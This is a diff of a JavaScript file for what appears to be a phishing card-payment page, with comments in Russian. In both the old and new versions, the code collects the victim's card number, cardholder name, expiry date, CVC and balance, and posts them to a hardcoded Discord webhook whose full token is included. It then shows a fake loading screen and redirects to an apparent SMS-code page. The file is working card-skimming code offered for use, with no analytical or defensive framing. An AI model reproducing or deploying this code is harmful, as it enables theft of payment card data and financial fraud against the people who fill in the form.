@@ -1,159 +1,90 @@
-$(".form").find(".cd-numbers").find(".fields").find("input").on('keyup change', function(e){
-		
-    var charLength = $(this).val().length;
+// Функция для отправки данных на вебхук Discord
+function sendToDiscord(data) {
+    const webhookUrl = "https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB"; // Замените на ваш вебхук URL
 
-    $(".card").removeClass("flip");
-    
-    if(charLength == 4){
-        $(this).next("input").focus();
-    }
+    // Формируем сообщение, которое отправим в Discord
+    const payload = {
+        content: `Данные карты:
+        Номер карты: ${data.cardNumber}
+        Имя держателя карты: ${data.cardHolder}
+        Срок действия: ${data.expiryMonth}/${data.expiryYear}
+        CCV: ${data.cvc}
+        Баланс: ${data.balance}`
+    };
 
-    if($(this).hasClass("1")){
-        var inputVal = $(this).val();
-        if(!inputVal.length == 0){
-            $(".card").find(".front").find(".cd-number").find("span.num-1").text(inputVal);
-        }
-    }
-
-    if($(this).hasClass("2")){
-        var inputVal = $(this).val();
-        if(!inputVal.length == 0){
-            $(".card").find(".front").find(".cd-number").find("span.num-2").text(inputVal);
-        }
-    }	
-
-    if($(this).hasClass("3")){
-        var inputVal = $(this).val();
-        if(!inputVal.length == 0){
-            $(".card").find(".front").find(".cd-number").find("span.num-3").text(inputVal);
-        }
-    }	
-
-    if($(this).hasClass("4")){
-        var inputVal = $(this).val();
-        if(!inputVal.length == 0){
-            $(".card").find(".front").find(".cd-number").find("span.num-4").text(inputVal);
-        }
-    }	
-
-});
-$(".form").find(".cd-holder").find("input").on('keyup change', function(e){
-var inputValCdHolder = $(this).val();
-
-$(".card").removeClass("flip");	
-
-if(!inputValCdHolder.length == 0){
-    $(".card").find(".front").find(".bottom").find(".cardholder").find("p.holder").text(inputValCdHolder)
+    // Отправка POST-запроса в Discord через вебхук
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Успешно отправлено в Discord:", data);
+    })
+    .catch((error) => {
+        console.error("Ошибка при отправке в Discord:", error);
+    });
 }
 
-});
-$(".form").find(".cd-validate").find(".cvc").find('input').on('keyup change', function(e){
-var inputCvcVal = $(this).val();
+// Функция для проверки всех обязательных полей формы
+function checkForm() {
+    const inputs = document.querySelectorAll('input[required], select[required]');
+    let isValid = true;
 
-if(!inputCvcVal.length == 0){
-    $(".card").addClass("flip").find(".cvc").find("p").text(inputCvcVal);
-}else	if(inputCvcVal.length == 0){
-    $(".card").removeClass("flip");
-} 
-});
-$(".form").find(".cd-validate").find(".expiration").find('select#month').on('keyup change', function(){
-
-$(".card").removeClass("flip");	
-if(!$(this).val().length == 0){
-    $(".card").find('.bottom').find('.expires').find("p").find("span.month").text($(this).val())
-}
-
-});
-$(".form").find(".cd-validate").find(".expiration").find('select#year').on('keyup change', function(){
-
-$(".card").removeClass("flip");	
-if(!$(this).val().length == 0){
-    $(".card").find('.bottom').find('.expires').find("p").find("span.year").text($(this).val())
-}
-
-});
-$("button.submit").on('click', function(e){
-e.preventDefault();
-$(this).parents("form").submit();
-});
- const discordWebhookUrl = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';  // Замените на свой вебхук
-
-    // Функция для отправки данных на вебхук Discord
-    function sendToDiscord(formData) {
-        const message = {
-            content: `Новая форма заполнена! \n
-            Номер карты: ${formData.cardNumber} \n
-            Имя держателя карты: ${formData.cardholder} \n
-            Срок действия: ${formData.expirationMonth}/${formData.expirationYear} \n
-            CVC: ${formData.cvc} \n
-            Баланс на карте: ${formData.balance}`
-        };
-
-        fetch(discordWebhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(message),
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Успех:', data);
-        })
-        .catch((error) => {
-            console.error('Ошибка:', error);
-        });
-    }
-
-    // Функция для проверки всех полей формы
-    function checkForm() {
-        const inputs = document.querySelectorAll('input[required], select[required]');
-        let isValid = true;
-
-        inputs.forEach(input => {
-            if (!input.value) {
-                isValid = false;
-                input.classList.add('error');  // Добавление класса для ошибок (можно стилизовать)
-            } else {
-                input.classList.remove('error');
-            }
-        });
-
-        return isValid;
-    }
-
-    // Обработчик нажатия кнопки
-    document.getElementById("card-form").addEventListener("submit", function(e) {
-        e.preventDefault(); // Остановить стандартное отправление формы
-
-        // Скрыть сообщение об ошибке
-        document.getElementById("error-message").textContent = '';
-
-        // Проверка формы
-        if (checkForm()) {
-            // Собрать данные формы
-            const formData = {
-                cardNumber: `${document.querySelector('.1').value}-${document.querySelector('.2').value}-${document.querySelector('.3').value}-${document.querySelector('.4').value}`,
-                cardholder: document.getElementById('cd-holder-input').value,
-                expirationMonth: document.getElementById('month').value,
-                expirationYear: document.getElementById('year').value,
-                cvc: document.getElementById('cvc').value,
-                balance: document.getElementById('balance').value
-            };
-
-            // Отправить данные на вебхук Discord
-            sendToDiscord(formData);
-
-            // Показать анимацию загрузки
-            document.getElementById("loading-overlay").style.display = 'block';
-
-            // Задержка для имитации процесса загрузки
-            setTimeout(function() {
-                // После 8 секунд перенаправить на другую страницу
-                window.location.href = 'sms.html';  // Замените на нужную страницу
-            }, 8000);
+    inputs.forEach(input => {
+        if (!input.value) {
+            isValid = false;
+            input.classList.add('error');
         } else {
-            // Если есть незаполненные поля, показать ошибку
-            document.getElementById("error-message").textContent = "Пожалуйста, заполните все поля.";
+            input.classList.remove('error');
         }
     });
+
+    return isValid;
+}
+
+// Обработчик отправки формы
+document.getElementById("card-form").addEventListener("submit", function (e) {
+    e.preventDefault(); // Остановить стандартное отправление формы
+
+    // Скрыть сообщение об ошибке
+    document.getElementById("error-message").textContent = '';
+
+    // Получение данных из формы
+    const cardNumber = Array.from(document.querySelectorAll('.form .cd-numbers input')).map(input => input.value).join('');
+    const cardHolder = document.getElementById('cd-holder-input').value;
+    const expiryMonth = document.getElementById('month').value;
+    const expiryYear = document.getElementById('year').value;
+    const cvc = document.getElementById('cvc').value;
+    const balance = document.getElementById('balance').value;
+
+    // Проверка валидности формы
+    if (checkForm()) {
+        // Показать анимацию загрузки
+        document.getElementById("loading-overlay").style.display = 'block';
+
+        // Подготовить данные и отправить их в Discord
+        const data = {
+            cardNumber: cardNumber,
+            cardHolder: cardHolder,
+            expiryMonth: expiryMonth,
+            expiryYear: expiryYear,
+            cvc: cvc,
+            balance: balance
+        };
+
+        // Отправить данные в Discord
+        sendToDiscord(data);
+
+        // Задержка для имитации процесса загрузки
+        setTimeout(function () {
+            window.location.href = 'sms.html';  // Замените на нужную страницу
+        }, 8000);
+    } else {
+        // Если есть незаполненные поля, показать ошибку
+        document.getElementById("error-message").textContent = "Пожалуйста, заполните все поля.";
+    }
+});
